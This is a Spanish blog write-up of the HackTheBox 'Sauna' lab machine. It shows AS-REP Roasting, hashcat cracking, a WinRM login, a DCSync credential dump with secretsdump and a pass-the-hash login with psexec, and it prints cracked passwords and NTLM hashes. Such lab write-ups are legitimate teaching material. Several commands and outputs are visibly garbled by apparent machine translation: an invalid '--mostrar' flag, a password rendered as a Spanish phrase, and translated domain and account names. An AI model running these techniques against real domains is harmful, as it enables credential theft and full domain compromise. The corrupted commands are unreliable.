
---
title: "Sauna"
summary: "Sauna es una máquina Windows de dificultad fácil que cuenta con enumeración y explotación de Active Directory. Los posibles nombres de usuario se pueden derivar de los nombres completos de los empleados que figuran en el sitio web. Con estos nombres de usuario, se puede realizar un ataque ASREPRoasting. Después de la enumeración, BloodHound revela que un usuario tiene el derecho extendido *DS-Replication-Get-Changes-All*, que permite realizar un ataque DCSync."
categories: ["Post","Blog",]
tags: ["post","hackthebox","windows"]
#externalUrl: ""
#showSummary: true
draft: false
date: 2025-01-31

---

| Información de la máquina         |              |
| -------------------- | ------------ |
| **Plataforma**         | HackTheBox   |
| **Sistema Operativo** | Windows      |
| **Dificultad**       | Fácil         |
| **IP**               | 10.10.10.175 |
## Enumeración

Como siempre, comenzamos con `Nmap`:

```bash
┌──(s3n㉿kali)-[~/Desktop/Box/recon]
└─$ nmap -p53,80,88,135,139,389,445,464,593,636,3268,3269,5985,9389 -sCV --min-rate 2000 -T5 -n -Pn 10.10.10.175 -oN ports
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-12 08:20 HST
Nmap scan report for 10.10.10.175
Host is up (0.043s latency).

PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Microsoft IIS httpd 10.0
|_http-title: Egotistical Bank :: Home
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|_  Potentially risky methods: TRACE
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-01-13 02:20:58Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: EGOTISTICAL-BANK.LOCAL0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: EGOTISTICAL-BANK.LOCAL0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp open  mc-nmf        .NET Message Framing
Service Info: Host: SAUNA; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 8h00m29s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2025-01-13T02:21:**05**
```

Primero, deberíamos echar un vistazo al puerto 80 para verificar el sitio web.

## Generar nombres de usuario desde la web
En la página **about.html** encontramos algunos nombres de usuario posibles, lo cual es bastante valioso en entornos Windows para probar cuentas AS-REP Roastable.
![sauna1](/img/sauna/sauna1.png)

Podemos guardar los nombres de usuario en un archivo de texto y con herramientas como [username_generator](https://github.com/shroudri/username_generator) podemos crear una lista de posibles nombres de usuario válidos.

```bash
┌──(s3n㉿kali)-[~/Desktop/Box/recon]
└─$ git clone https://github.com/shroudri/username_generator
Cloning into 'username_generator'...
remote: Enumerating objects: 16, done.
remote: Counting objects: 100% (16/16), done.
remote: Compressing objects: 100% (14/14), done.
Receiving objects: 100% (16/16), 6.38 KiB | 3.19 MiB/s, done.
Resolving deltas: 100% (2/2), done.
remote: Total 16 (delta 2), reused 0 (delta 0), pack-reused 0 (from 0)
                                                                                                                                                                                      
┌──(s3n㉿kali)-[~/Desktop/Box/recon]
└─$ nano users.txt            
                                                                                                                                                                                      
┌──(s3n㉿kali)-[~/Desktop/Box/recon]
└─$ python3 username_generator/username_generator.py -w users.txt 
fergus
smith
f.smith
f-smith
f_smith
f+smith
fsmith
fergussmith
smithfergus
fergus.smith
smith.fergus
hugo
bear
h.bear
h-bear
h_bear
h+bear
hbear
```

¡Genial! Como ya hemos dicho, podemos intentar hacer AS-REP Roast con estos nuevos nombres de usuario. ¡Vamos a intentarlo!
## AS-REP Roasting

**AS-REP Roasting** es un ataque en _Active Directory_ que explota las cuentas de usuario con la configuración **“No requerir autenticación previa de Kerberos”** habilitada. En un proceso de autenticación Kerberos normal, la autenticación previa impide el acceso no autorizado al exigir al cliente que encripte una marca de tiempo con el hash de la contraseña del usuario antes de solicitar la autenticación.

Sin embargo, cuando esta protección está deshabilitada, un atacante puede solicitar una AS-REP (respuesta del servicio de autenticación) para la cuenta de destino **sin necesidad de credenciales válidas**. El controlador de dominio responde entonces con un mensaje AS-REP cifrado que contiene un ticket de concesión de tickets (TGT), que se cifra utilizando el hash de la contraseña del usuario. Podríamos capturar esta respuesta y descifrarla sin conexión utilizando herramientas como **Hashcat**.

En este caso, podemos realizar este tipo de ataque con el script impacket **GetNPUsers**:
```bash
┌──(s3n㉿kali)-[~/Desktop/Box/recon]
└─$ sudo impacket-GetNPUsers -request -usersfile mutated_users.txt -dc-ip 10.10.10.175 EGOTISTICAL-BANK.LOCAL/ 
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

/usr/share/doc/python3-impacket/examples/GetNPUsers.py:165: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).
  now = datetime.datetime.utcnow() + datetime.timedelta(days=1)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
$krb5asrep$23$fsmith@EGOTISTICAL-BANK.LOCAL:4dcaa316dcec649688cb0371ea8277e9$64e3539a4e39c89428a623458153ba7e38f43a11ff14692160cfeb8471ccf26921ebdf5a6d6718a1f384326572845b0a86144ca9fe06b903e1c5b9d277f17b5c80dc1d9234d59f4bdf1173d8f8471cbfe7f4db197b9bd7ded4b15b85b73a138757cffbd3ff14f26bb0588702f2cc25c79c86411f613801ff2119a22e30cd7462c8abd608aa0390223d667920d57f81e0e8cbe9c1362c7d452fa6f16906c1ff351546f318838ba90baf85dd359c8a875659ab597b87b2d94bee275b5e4c997b2c660eb1500ee0cc1b7fe96578dbc4584a23ce64a58ec52f33a5fe62b0149fdf03607ac0e32423afd4b9776947eec5cfd6b3eb51340d66c47c34df3c4507158f69
```

¡Genial! Parece que pudimos recuperar el TGT. El siguiente paso es intentar descifrarlo:

## Descifrando el hash
Para descifrar el hash, usaré **HashCat** con el modo **18200**:
```bash
┌──(s3n㉿kali)-[~/Desktop/Box/recon]
└─$ sudo hashcat -m 18200 hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force --mostrar

$krb5asrep$23$fsmith@EGOTISTICAL-BANK.LOCAL:a8bd01da689627922de7e2d6ae592cd1$7713ccb10f010cde184f5d25974bedb64b3eb853362a3b73f9bb8406522b7ad9181059 c95150045f22eedf51f83456065cfb1e8b5047936fc8ee4056c01b987477608982b208eef831d7913e4bcb0df485f2e0795f2dc92af975286f96350f2aafd6068f7ab88f4fd00805c53d61faa870 8573bb8e6669953aca2de57df74efc3f9e501abb678bb61b1ef6d95728d60b71ce9593a74e929 951eb85bbb9abe96a1d46950f20417299f7f80af4288eac5b228d5d799b0de30bfc8957dad1c4d eb416f1e70916a774aed53950d451c4e05f77630a5668f9eb7b38e7b4a36e7b9e43733dfe7b1ff019f05536bc0313fe428114020227b9ada3bdcc485ebc0e4db579:Thestrokes23
```

¡Genial! Logramos obtener las credenciales. Intentemos obtener un shell como el usuario **fsmith**:
## Intrusión
Como el puerto **5985** está abierto, podemos intentar entrar mediante WinRM:
```bash
┌──(s3n㉿kali)-[~/Desktop/Box/recon]
└─$ evil-winrm -i 10.10.10.175 -u fsmith -p Thestrokes23

*Evil-WinRM* PS C:\Users\FSmith\Documents> whoami
egotisticalbank\fsmith
```

## Indicador de usuario
Es hora de leer el indicador de usuario:
```powershell
*Evil-WinRM* PS C:\Users\FSmith\Desktop> type user.txt
a6395453...b505308e
```
## Privilegio Escalada
Ahora tenemos que buscar la manera de elevar los privilegios. Después de un poco de enumeración, ejecuté **WinPEAS.exe**, que es una herramienta bastante buena para buscar rutas de privilegios.

El resultado que genera este programa es bastante grande, pero hay algo que se destaca:
```powershell

ÉÍÍÍÍÍÍÍÍÍÍÍ¹ Buscando credenciales de inicio de sesión automático
Se encontraron algunas credenciales de inicio de sesión automático
DefaultDomainName : EGOTISTICALBANK
DefaultUserName : EGOTISTICALBANK\svc_loanmanager
DefaultPassword : Moneymakestheworldgoround!
```

¡Más credenciales! Veamos qué podemos hacer con ellas:
## BloodHound
En las máquinas de Active Directory, recomiendo ejecutar [BloodHound](https://s3ntinl.github.io/posts/bloodhound/) ya que es la forma más fácil de verificar las rutas de escalada.

![sauna2](/img/sauna/sauna2.png)

Como podemos ver, el usuario **svc_loanmgr** tiene derecho a realizar un **DCSync**.
## DCSync
Un **ataque DCSync** es una técnica en la que un atacante abusa de los permisos de replicación en Active Directory para extraer credenciales confidenciales. Normalmente, los controladores de dominio sincronizan los datos de los usuarios entre sí mediante el **Servicio de replicación de directorios (DRS)**. Sin embargo, si un atacante obtiene el control de una cuenta con **privilegios de replicación**, como un **Administrador de dominio** o una cuenta con el permiso **Replicar todos los cambios del directorio**, puede hacerse pasar por un controlador de dominio y solicitar hashes de contraseñas para cualquier usuario, incluido **krbtgt**.

Y esto es básicamente lo que podemos hacer con el usuario **svc_loanmgr**. Esta vez, podemos usar el script **secretsdump** de Impacket.

```bash
┌──(s3n㉿kali)-[~/Desktop/Box/recon]
└─$ sudo impacket-secretsdump 'EGOTISTICAL-BANK'/'svc_loanmgr':'¡El dinero hace que el mundo gire!'@'10.10.10.175'
Impacket v0.12.0 - Copyright Fortra, LLC y sus compañías afiliadas

[-] Error en RemoteOperations: Error de tiempo de ejecución de DCERPC: código: 0x5 - rpc_s_access_denied
[*] Volcado de credenciales de dominio (domain\uid:rid:lmhash:nthash)
[*] Uso del método DRSUAPI para obtener NTDS.DIT secretos
Administrador:500:aad3b435b51404eeaad3b435b51404ee:823452073d75b9d1cf70ebdf86c7f98e:::
Invitado:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0 c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:4a8899428cad97676ff802229e466e2c:::
BANCO EGOÍSTA.LOCAL\HSmith:1103:aad3b435b51404eeaad3b435b51404ee:58a52d3 6c84fb7f5f1beab9a201db1dd:::
BANCO EGOÍSTA.LOCAL\FSmith:1105:aad3b435b51404eeaad3b435b51404ee:58a52d36c84fb7f5f1beab9a201db1dd:::
BANCO EGOÍSTA.LOCAL\svc_loan gerente:1108:aad3b435b51404eeaad3b435b51404ee:9cb31797c39a9b170b04058ba2bba48c:::
SAUNA$:1000:aad3b435b51404eeaad3b435b51404ee:8e22e0a93dc3c341734c716a7144cc35
```

Con Con el ataque **DCSync** logramos obtener el hash NTLM del Administrador, que se puede usar con una herramienta como **PSExec** para hacer un inicio de sesión de tipo **Pass-The-Hash**:

```bash
┌──(s3n㉿kali)-[/opt/bloodhound]
└─$ impacket-psexec -hashes aad3b435b51404eeaad3b435b51404ee:823452073d75b9d1cf70ebdf86c7f98e Administrator@10.10.10.175
Impacket v0.12.0 - Copyright Fortra, LLC y sus empresas afiliadas

Microsoft Windows [Versión 10.0.17763.973]
(c) 2018 Microsoft Corporation. Todos los derechos reservados.

C:\Users\Administrator\Desktop> whoami
nt authority\system
```

¡Y la máquina está rooteada!

```powershell
C:\Users\Administrator\Desktop> type root.txt
13474821...26f0e113
```